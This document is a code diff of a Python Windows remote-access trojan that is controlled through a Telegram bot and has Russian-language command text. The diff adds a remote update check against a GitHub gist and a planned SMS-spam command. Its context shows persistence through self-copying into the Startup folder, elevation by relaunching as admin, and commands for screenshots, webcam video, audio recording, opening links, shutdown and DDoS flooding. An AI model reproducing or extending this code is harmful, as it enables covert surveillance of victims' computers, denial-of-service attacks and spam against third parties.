@@ -44,6 +44,14 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
+result = requests.get("https://gist.githubusercontent.com/bagaZh/8190cb05ca014a81d6fad8ff61bf2e33/raw/80b78c7ee5ea2b7cbfffd8c3b6c339580873b278/version.txt")
+last_ver = result.content.decode("utf-8")
+a = open(f"{user_path}\\AppData\\Roaming\\version.txt", "r")
+current_ver = a.read()
+a.close()
+if last_ver != current_ver:
+    bot.send_message(usid, f'Найдено новое обновление {current_ver}, для обновления нажмите ---> /update')
+
 if is_admin():
     
     Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
@@ -53,7 +61,7 @@ if is_admin():
 
     
     os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-    os.system(f'copy "{tfn}version.txt" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+    os.system(f'copy "{tfn}version.txt" "{user_path}\\AppData\\Roaming"')
 
     while True:
         try:
@@ -70,25 +78,9 @@ if is_admin():
                 if message.chat.id==int(usid) or fl==1:
                     try:
                         bot.send_message(message.chat.id, """
-                        
-                            Мои команды:
                             \n MADE BY L baga
                             \n Дискорд сервер L baga - https://discord.gg/PXXHeSDdym
-                            \n/screen - Скриншот
-                            \n/pc_info - Данные о пк
-                            \n/webp - Фото с веб камеры
-                            \n/open_link https://ссылка - Открывает ссылку в браузере и присылает скриншот
-                            \n/msgbox текст - Выводит окно с вашим текстом
-                            \n/webcamvideo длительность в цифрах 1000 примерно 39 секунды - Записать видео с веб камеры
-                            \n/audio длительность в цифрах 1000 примерно 23 секунды - Запись аудио с пк
-                            \n/volumeON - Включит максимальную громкость
-                            \n/volumeOFF - Выключит звук
-                            \n/shutdown - Выключит пк
-                            \n/ddos ip port packets - ddos. Пример: '/ddos 127.0.0.0 5674 50' пакеты лучше ставить не больше 100
-                            \n/restart - Перезагрузит пк
-                            \n/update - Откроет ссылку для обновления до актуальной версии
-                            \n/altf4 - Исполнит сочетание клавиш alf + f4
-                            \n/hidePG - Свернёт все окна""")
+                            \n/help - Все команды""")
                     except Exception as e:
                         bot.reply_to()
                 else:
@@ -115,7 +107,8 @@ if is_admin():
                             \n/ddos ip port packets - ddos. Пример: '/ddos 127.0.0.0 5674 50' пакеты лучше ставить не больше 100
                             \n/update - Откроет ссылку для обновления до актуальной версии
                             \n/altf4 - Исполнит сочетание клавиш alf + f4
-                            \n/hidePG - Свернёт все окна""")
+                            \n/hidePG - Свернёт все окна
+                            \n/smspam ru/bu number - Скоро...""")
                     except Exception as e:
                         bot.reply_to()
                 else:
@@ -377,7 +370,7 @@ if is_admin():
                     bot.reply_to(message, 'Обновляемся...')
                     result = requests.get("https://gist.githubusercontent.com/bagaZh/8190cb05ca014a81d6fad8ff61bf2e33/raw/80b78c7ee5ea2b7cbfffd8c3b6c339580873b278/version.txt")
                     last_ver = result.content.decode("utf-8")
-                    a = open("version.txt", "r")
+                    a = open(f"{user_path}\\AppData\\Roaming\\version.txt", "r")
                     current_ver = a.read()
                     a.close()
                     if last_ver != current_ver:
@@ -472,5 +465,3 @@ if is_admin():
 else:
     if sys.version_info[0] == 3:
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-    else:#in python2.x
-        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)    
